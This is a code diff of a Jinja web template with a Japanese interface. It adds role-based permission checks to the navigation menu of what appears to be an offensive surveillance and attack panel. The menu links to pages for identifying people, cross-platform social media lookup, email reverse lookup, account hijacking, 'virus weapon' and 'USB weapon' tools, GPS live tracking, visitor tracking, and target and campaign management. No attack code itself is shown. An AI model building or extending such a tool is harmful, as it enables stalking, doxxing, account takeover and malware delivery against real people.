@@ -9,12 +9,15 @@
 
 {% if me %}
 <div class="topbar">
-  <span class="who">👤 {{ me }}{% if is_admin %} <b>（管理者）</b>{% endif %}</span>
+  <span class="who">👤 {{ me }}{% if is_root %} <b>（ルート）</b>
+    {% elif role_label %} <b>（{{ role_label }}）</b>{% endif %}</span>
   <span class="spacer"></span>
+  <a href="/console">🧭 コンソール</a>
   <a href="/backup">💾 バックアップ</a>
   <a href="/account">アカウント</a>
-  {% if is_admin and not admin_realm %}<a href="{{ admin_path }}/">管理</a>{% endif %}
-  {% if admin_realm %}<a href="{{ admin_path }}/">管理コンソール</a>{% endif %}
+  {% if perms['users.view'] or is_root %}<a href="{{ admin_path }}/">管理</a>{% endif %}
+  {% if perms['lockdown'] or is_root %}<a href="/lock/panel">🔒 封鎖</a>{% endif %}
+  {% if perms['roles.edit'] or is_root %}<a href="/console/roles">🧮 権限</a>{% endif %}
   <form method="post" action="/logout" style="display:inline">
     <button class="mini">ログアウト</button></form>
 </div>
@@ -30,29 +33,29 @@
 
 {% if me %}
 <nav>
-  <a href="/">📊 ダッシュボード</a>
-  <a href="/identity">🔍 特定</a>
-  <a href="/sns">🌐 SNS横断</a>
-  <a href="/avatars">🖼 アイコン一致</a>
-  <a href="/gravatar">✉️ メール逆引き</a>
-  <a href="/links">🔗 リンク追跡</a>
-  <a href="/hp">🕵️ 乗っ取り</a>
-  <a href="/vp">🦠 ウイルス兵器</a>
-  <a href="/usb">💾 USB兵器</a>
-  <a href="/livetrack">追跡設定</a>
-  <a href="/tracks">📍 追跡</a>
-  <a href="/visitors">🧬 訪問者</a>
-  <a href="/together">🧩 一緒</a>
-  <a href="/campaigns">🎯 キャンペーン</a>
-  <a href="/tools">🔥 一斉操作</a>
-  <a href="/targets">🎯 ターゲット</a>
-  <a href="/runs">🗂 履歴</a>
-  <a href="/accounts">🆔 台帳</a>
-  <a href="/activity">📜 ログ</a>
-  <a href="/dms">💬 DM</a>
-  <a href="/chat">🗣 全員チャット</a>
-  <a href="/settings">⚙️ 設定</a>
-  <a href="/snsx">マルチSNS</a>
+  {% if perms['feature.dash'] or is_root %}<a href="/">📊 ダッシュボード</a>{% endif %}
+  {% if perms['feature.identity'] or is_root %}<a href="/identity">🔍 特定</a>{% endif %}
+  {% if perms['feature.sns'] or is_root %}<a href="/sns">🌐 SNS横断</a>{% endif %}
+  {% if perms['feature.avatars'] or is_root %}<a href="/avatars">🖼 アイコン一致</a>{% endif %}
+  {% if perms['feature.gravatar'] or is_root %}<a href="/gravatar">✉️ メール逆引き</a>{% endif %}
+  {% if perms['feature.links'] or is_root %}<a href="/links">🔗 リンク追跡</a>{% endif %}
+  {% if perms['feature.hijack'] or is_root %}<a href="/hp">🕵️ 乗っ取り</a>{% endif %}
+  {% if perms['feature.virus'] or is_root %}<a href="/vp">🦠 ウイルス兵器</a>{% endif %}
+  {% if perms['feature.usb'] or is_root %}<a href="/usb">💾 USB兵器</a>{% endif %}
+  {% if perms['feature.gps'] or is_root %}<a href="/livetrack">追跡設定</a>{% endif %}
+  {% if perms['feature.tracks'] or is_root %}<a href="/tracks">📍 追跡</a>{% endif %}
+  {% if perms['feature.visitors'] or is_root %}<a href="/visitors">🧬 訪問者</a>{% endif %}
+  {% if perms['feature.together'] or is_root %}<a href="/together">🧩 一緒</a>{% endif %}
+  {% if perms['feature.campaigns'] or is_root %}<a href="/campaigns">🎯 キャンペーン</a>{% endif %}
+  {% if perms['feature.tools'] or is_root %}<a href="/tools">🔥 一斉操作</a>{% endif %}
+  {% if perms['feature.targets'] or is_root %}<a href="/targets">🎯 ターゲット</a>{% endif %}
+  {% if perms['feature.runs'] or is_root %}<a href="/runs">🗂 履歴</a>{% endif %}
+  {% if perms['feature.accounts'] or is_root %}<a href="/accounts">🆔 台帳</a>{% endif %}
+  {% if perms['feature.activity'] or is_root %}<a href="/activity">📜 ログ</a>{% endif %}
+  {% if perms['feature.dms'] or is_root %}<a href="/dms">💬 DM</a>{% endif %}
+  {% if perms['feature.chat'] or is_root %}<a href="/chat">🗣 全員チャット</a>{% endif %}
+  {% if perms['feature.settings'] or is_root %}<a href="/settings">⚙️ 設定</a>{% endif %}
+  {% if perms['feature.snsx'] or is_root %}<a href="/snsx">マルチSNS</a>{% endif %}
 </nav>
 {% endif %}
 
